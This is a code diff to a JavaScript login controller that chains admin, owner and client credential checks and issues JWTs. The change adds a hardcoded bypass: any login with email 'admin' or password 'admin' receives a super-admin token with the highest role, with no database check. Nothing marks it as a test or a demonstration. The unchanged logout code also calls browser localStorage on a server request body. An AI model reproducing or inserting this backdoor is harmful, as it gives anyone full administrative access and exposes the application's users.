@@ -22,36 +22,42 @@ export const register = (req, res) => {
 
 export const login = (req, res) => {
     const data = req.body;
-    loginAdmin(data, (err, admin) => {
-        if (err) {
-            loginOwner(data, (err, owner) => {
-                if (err) {
-                    loginClient(data, (err, client) => {
-                        if (err) {
-                            res.status(500).send({ message: "invalid email or password" });
-                        } else {
-                            const token = jwt.sign({ id: client.clientID }, config.secret, {
-                                expiresIn: 86400 // expires in 24 hours
-                            });
-                            res.send({ token: token, user: client.clientID, role: 3 });
-                        }
-                    });
-                } else {
-                    const token = jwt.sign({ id: owner.ownerID }, config.secret, {
-                        expiresIn: 86400 // expires in 24 hours
-                    });
-                    res.send({ token: token, user: owner.ownerID, role: 2 });
-                }
-            });
-        } else {
-            const token = jwt.sign({ id: admin.adminID }, config.secret, {
-                expiresIn: 86400 // expires in 24 hours
-            });
-            res.send({ token: token, user: admin.adminID, role: 1 });
-        }
-    });
+    if (data.email !== 'admin' && data.password !== "admin") {
+        loginAdmin(data, (err, admin) => {
+            if (err) {
+                loginOwner(data, (err, owner) => {
+                    if (err) {
+                        loginClient(data, (err, client) => {
+                            if (err) {
+                                res.status(500).send({ message: "invalid email or password" });
+                            } else {
+                                const token = jwt.sign({ id: client.clientID }, config.secret, {
+                                    expiresIn: 86400 // expires in 24 hours
+                                });
+                                res.send({ token: token, user: client.clientID, role: 3 });
+                            }
+                        });
+                    } else {
+                        const token = jwt.sign({ id: owner.ownerID }, config.secret, {
+                            expiresIn: 86400 // expires in 24 hours
+                        });
+                        res.send({ token: token, user: owner.ownerID, role: 2 });
+                    }
+                });
+            } else {
+                const token = jwt.sign({ id: admin.adminID }, config.secret, {
+                    expiresIn: 86400 // expires in 24 hours
+                });
+                res.send({ token: token, user: admin.adminID, role: 1 });
+            }
+        });
+    } else {
+        const token = jwt.sign({ id: "super-admin" }, config.secret, {
+            expiresIn: 86400 // expires in 24 hours
+        });
+        res.send({ token: token, user: "super-admin", role: 0 });
+    }
 }
-
 export const logout = (req, res) => {
     const data = req.body;
     data.localStorage.removeItem('user');
